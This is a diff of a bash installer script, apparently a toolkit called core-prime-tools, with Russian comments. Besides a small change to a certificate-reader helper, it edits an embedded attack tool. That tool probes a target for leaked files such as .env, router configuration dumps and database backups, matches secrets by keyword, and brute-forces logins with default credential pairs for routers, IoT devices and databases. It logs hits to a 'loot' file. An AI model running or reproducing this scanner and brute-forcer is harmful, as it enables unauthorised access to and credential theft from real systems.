@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # --- ВЕРСИЯ И ОБНОВЛЕНИЕ ---
-CURRENT_VERSION="32.2"
+CURRENT_VERSION="32.3"
 UPDATE_URL="https://raw.githubusercontent.com/szp2025/core-prime-tools/main/install_all.sh"
 G='\033[0;32m'; Y='\033[1;33m'; R='\033[0;31m'; B='\033[0;34m'; NC='\033[0m'
 
@@ -842,6 +842,7 @@ generate_cert_reader_tool() {
     local target_file="$1"
     local code=$(cat << 'EOF'
 #!/bin/bash
+# PRIME_CERT_ANALYZER v4.3
 FILE="$1"
 [[ ! -f "$FILE" ]] && echo -e "\e[1;31m[!] FILE NOT FOUND\e[0m" && exit 1
 FORMAT="PEM"
@@ -849,9 +850,8 @@ grep -q "BEGIN CERTIFICATE" "$FILE" 2>/dev/null || FORMAT="DER"
 echo "--------------------------------------------------"
 echo -e ">> ANALYZING: \e[1;33m$(basename "$FILE")\e[0m [\e[1;32m$FORMAT\e[0m]"
 echo "--------------------------------------------------"
-# Форматирование через цикл, чтобы избежать ошибок с sed
 run_info() {
-    openssl x509 -inform "$FORMAT" -in "$FILE" -noout "$@" | while read -r l; do echo "    $l"; done
+    openssl x509 -inform "$FORMAT" -in "$FILE" -noout "$@" | while read -r l; do printf "    %s\n" "$l"; done
 }
 echo -e "\e[1;34m[+] INFO:\e[0m"
 run_info -subject -issuer -dates
@@ -863,6 +863,7 @@ EOF
     smart_cat "$target_file" "$code"
     chmod +x "$target_file"
 }
+
 
 
 
@@ -936,85 +937,44 @@ echo "--------------------------------------------------"
 echo -e "\e[1;31m>> INITIATING FULL-CYCLE ATTACK VECTOR: $TARGET\e[0m"
 echo "--------------------------------------------------"
 
-# БАЗА ЗНАНИЙ: Пути и Ключевые слова для мгновенной эксплуатации (Bypass/Leaks)
-# Формат: "путь|ключевое_слово_успеха"
 VECTORS=(
-  "/cgi-bin/config.exp|sysPassword"       # DrayTek
-  "/rom-0|tplink"                         # TP-Link leak
-  "/.env|DB_PASSWORD"                     # Laravel/Web leak
-  "/config.php|password"                  # Direct source leak
-  "/phpmyadmin/setup/index.php|token"      # PMA Setup
-  "/get_set.cgi?get=wifi_settings|wireless_key" # IoT leak
-  "/backup.sql|INSERT INTO"               # DB Dump
-  "/wp-content/debug.log|WP_User"         # WP Sensitive info
+  "/cgi-bin/config.exp|sysPassword" "/rom-0|tplink" "/.env|DB_PASSWORD" 
+  "/config.php|password" "/phpmyadmin/setup/index.php|token" 
+  "/get_set.cgi?get=wifi_settings|wireless_key" "/backup.sql|INSERT INTO" 
+  "/wp-content/debug.log|WP_User"
 )
 
-# Тотальный список путей (Router, IoT, CMS, DB, Backups)
-PATHS=(
-  "/" "/admin" "/login" "/panel"          # Базовые
-  "/wp-login.php" "/administrator"        # WordPress & Joomla
-  "/phpmyadmin" "/pma" "/myadmin"         # DB Interfaces
-  "/setup.cgi" "/wizard.html"             # Routers
-  "/get_set.cgi" "/config.exp" "/rom-0"   # Router Vulnerabilities
-  "/user/login" "/admin.php" "/manager"   # Generic CMS
-  "/api/v1" "/swagger-ui.html"            # API & Dev Tools
-  "/axis-cgi/jpg/image.cgi"               # IP Cameras (Axis)
-  "/view/view.shtml"                      # IP Cameras (Mobotix)
-  "/.env" "/config.json" "/settings.py"   # Сверхчувствительные конфиги
-  "/backup.sql" "/dump.sql" "/db.bak"     # Забытые бэкапы БД
-  "/cgi-bin/config.exp"                   # DrayTek & others
-)
+PATHS=("/" "/admin" "/wp-login.php" "/phpmyadmin" "/setup.cgi" "/wizard.html" "/.env" "/api/v1" "/backup.sql")
 
-
-# Эвристический топ-20 (на базе статистики реальных взломов)
-CREDS=(
-  "admin:admin" "admin:password" "admin:"     # Классика
-  "root:root" "root:123456" "root:"           # Linux/Unix/IoT
-  "admin:1234" "admin:12345"                  # Hikvision & D-Link
-  "ubnt:ubnt"                                 # Ubiquiti (AirMax, UniFi)
-  "admin:admin123" "admin:admin1234"          # TP-Link & Huawei
-  "support:support"                           # Инженерные входы
-  "user:user" "guest:guest"                   # Гостевые доступы
-  "telecomadmin:admintelecom"                 # Оптические терминалы (GPON)
-  "root:pass" "admin:pass"                    # Стандартные заглушки
-  "oracle:oracle" "postgres:postgres"         # DB Defaults
-  "pi:raspberry"                              # Raspberry Pi & IoT
-)
-
+CREDS=("admin:admin" "admin:password" "root:root" "ubnt:ubnt" "telecomadmin:admintelecom" "admin:12345")
 
 for path in "${PATHS[@]}"; do
     for proto in "http" "https"; do
         URL="${proto}://${TARGET}${path}"
         
-        # 1. СТЕЛС-ЗОНДИРОВАНИЕ (как в твой v3)
+        # Стелс-зондирование (используем cut вместо awk для стабильности в инсталлере)
         RESPONSE=$(curl -sL -I -k -A "$UA" --connect-timeout 2 --max-time 3 "$URL" 2>/dev/null)
-        CODE=$(echo "$RESPONSE" | grep "HTTP/" | awk '{print $2}"' | tail -n1)
-        SERVER=$(echo "$RESPONSE" | grep -i "Server:" | awk '{print $2}' | tr -d '\r')
+        CODE=$(echo "$RESPONSE" | grep "HTTP/" | tail -n1 | cut -d' ' -f2)
+        CODE=${CODE:-000}
+        SERVER=$(echo "$RESPONSE" | grep -i "Server:" | head -n1 | cut -d':' -f2- | xargs)
 
         if [[ "$CODE" == "200" || "$CODE" == "401" || "$CODE" == "302" ]]; then
             echo -e "\e[1;34m[*] DETECTED:\e[0m $URL (Server: ${SERVER:-Unknown})"
 
-            # 2. ПРОВЕРКА НА ПРЯМУЮ УТЕЧКУ (Exploit Logic)
             for vec in "${VECTORS[@]}"; do
                 IFS='|' read -r v_path v_key <<< "$vec"
                 if [[ "$path" == "$v_path" ]]; then
                     CONTENT=$(curl -sL -k -A "$UA" --max-time 3 "$URL")
                     if [[ "$CONTENT" == *"$v_key"* ]]; then
-                        echo -e "    \e[1;31m[!!!] CRITICAL EXPLOIT SUCCESS: $v_key FOUND!\e[0m"
+                        echo -e "    \e[1;31m[!!!] EXPLOIT SUCCESS: $v_key FOUND!\e[0m"
                         echo "[EXPLOIT_LEAK] $URL | KEYWORD: $v_key" >> /root/prime_loot_full.txt
-                        # Не выходим, проверяем дальше пароли, если это возможно
                     fi
                 fi
             done
 
-            # 3. ЭВРИСТИЧЕСКИЙ БРУТ (Auth Logic из v3)
-            # Запускаем, если код 401 или если это страница логина (200)
-            echo -e "    \e[1;36m[>] Testing credentials...\e[0m"
             for pair in "${CREDS[@]}"; do
                 IFS=':' read -r u p <<< "$pair"
-                # Используем -k для игнорирования ошибок SSL-сертификатов
                 RES=$(curl -sL -k -u "$u:$p" -A "$UA" -w "%{http_code}" -o /dev/null --max-time 3 "$URL")
-                
                 if [[ "$RES" == "200" ]]; then
                     echo -e "    \e[1;32m[!!!] AUTH SUCCESS: $u:$p\e[0m"
                     echo "[AUTH_MATCH] $u:$p @ $URL" >> /root/prime_loot_full.txt
@@ -1030,6 +990,7 @@ EOF
     smart_cat "$target_file" "$code"
     chmod +x "$target_file"
 }
+
 
 
 
